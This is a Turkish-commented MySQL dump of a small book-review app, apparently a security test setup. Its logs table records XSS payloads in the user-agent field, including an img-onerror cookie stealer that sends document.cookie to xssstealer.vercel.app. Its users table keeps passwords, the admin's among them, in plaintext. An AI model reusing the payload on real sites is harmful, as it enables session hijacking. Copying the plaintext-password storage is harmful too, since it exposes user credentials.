SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `kek`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `books`
--

CREATE TABLE `books` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `author` varchar(255) NOT NULL,
  `description` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `books`
--

INSERT INTO `books` (`id`, `title`, `author`, `description`) VALUES
(1, 'Siber Güvenlik El Kitabı', 'Hacker A', 'Siber güvenlik dünyasının temellerini ve gelişmiş tekniklerini anlatan bir başyapıt.'),
(2, 'Web Zafiyetleri Rehberi', 'Zafiyet Avcısı', 'En yaygın web zafiyetlerini ve bunlara karşı alınacak önlemleri detaylandıran bir rehber.'),
(3, 'Kod Mimarisi Sanatı', 'Mimar X', 'Temiz, okunabilir ve sürdürülebilir kod yazma prensiplerini ele alan derinlemesine bir kitap.');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `book_id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `comment` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `comments`
--

INSERT INTO `comments` (`id`, `book_id`, `username`, `comment`) VALUES
(11, 2, 'seksican', 'seksican çok seksidir.'),
(12, 2, 'seksican', 'hemde çok'),
(13, 1, 'deneme', 'deneme'),
(14, 1, 'deneme', 'sss'),
(15, 1, 'deneme', 'deneme'),
(16, 2, 'kekeme', 'aaaa');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `timestamp` timestamp NULL DEFAULT current_timestamp(),
  `ip_address` varchar(45) NOT NULL,
  `user_agent` text NOT NULL,
  `reason` varchar(255) NOT NULL,
  `username` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `logs`
--

INSERT INTO `logs` (`id`, `timestamp`, `ip_address`, `user_agent`, `reason`, `username`) VALUES
(1, '2025-08-08 18:00:52', '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'Kullanıcı yorum yaptı.', 'deneme'),
(2, '2025-08-08 18:07:27', '127.0.0.1', '<img src onerror=\"this.onerror=null;fetch(\'https://xssstealer.vercel.app/?c=\'+encodeURIComponent(document.cookie),{mode:\'no-cors\'})\">', 'Kullanıcı yorum yaptı.', 'deneme'),
(3, '2025-08-08 18:12:29', '127.0.0.1', '\'\"><script>alert(1)</script>', 'User-Agent\'ta XSS denemesi tespit edildi.', 'misafir'),
(4, '2025-08-08 18:12:29', '127.0.0.1', '\'\"><script>alert(1)</script>', 'Kullanıcı yorum yaptı.', 'deneme'),
(5, '2025-08-09 19:52:30', '127.0.0.1', '<img src onerror=\"this.onerror=null;fetch(\'https://xssstealer.vercel.app/?c=\'+encodeURIComponent(document.cookie),{mode:\'no-cors\'})\">', 'Kullanıcı yorum yaptı.', 'kekeme');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `role` varchar(50) NOT NULL DEFAULT 'user'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `role`) VALUES
(1, 'admin', 'kekekekeke1213', 'admin'),
(2, 'morican1337', 'moricankekeq', 'user'),
(6, 'seksican', 'seksican', 'user'),
(7, 'deneme', 'deneme', 'user'),
(8, 'kekeme', 'kekeme', 'user');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `books`
--
ALTER TABLE `books`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`),
  ADD KEY `book_id` (`book_id`);

--
-- Tablo için indeksler `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `books`
--
ALTER TABLE `books`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;

--
-- Tablo için AUTO_INCREMENT değeri `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=17;

--
-- Tablo için AUTO_INCREMENT değeri `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- Tablo için AUTO_INCREMENT değeri `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- Dökümü yapılmış tablolar için kısıtlamalar
--

--
-- Tablo kısıtlamaları `comments`
--
ALTER TABLE `comments`
  ADD CONSTRAINT `comments_ibfk_1` FOREIGN KEY (`book_id`) REFERENCES `books` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
